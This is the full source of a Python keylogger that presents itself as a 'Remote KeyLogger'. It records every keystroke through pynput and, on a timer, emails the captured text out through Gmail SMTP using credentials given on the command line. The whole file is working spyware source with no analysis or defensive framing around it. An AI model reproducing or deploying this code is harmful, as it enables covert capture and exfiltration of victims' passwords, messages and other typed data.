#!/usr/bin/env python
import argparse
import pynput.keyboard
import threading
import smtplib

class Keylogger:
    def __init__(self, time_interval, email, password ):
        self.log = "Keylogger Started"
        self.interval = time_interval
        self.email = email
        self.password = password
    
    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key): #call back function
        try:
            current_key =  str(key.char)
        except AttributeError:
            if key == key.space:
                current_key =  " "
            else:
                current_key =  " " + str(key) + " "
        self.append_to_log(current_key)
        
    def report(self):
        self.finalog = '\n\n' + self.log
        self.send_mail(self.email, self.password, self.finalog)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()
    
    def send_mail(self,email, password, message):
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email, email, message)
        server.quit()
    
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

parser = argparse.ArgumentParser()
parser.add_argument('--time',type=int, help = "time interval required seconds like -t 60", required=True)
parser.add_argument('--mail', help = "Mail requrired to Report for keylogs", required=True)
parser.add_argument('--password', help = "mail account password required",required=True)
args = parser.parse_args()
time = args.time
mail = args.mail
password = args.password
print("Remote KeyLogger Running....")
my_keylogger = Keylogger(time, mail, password)
my_keylogger.start()
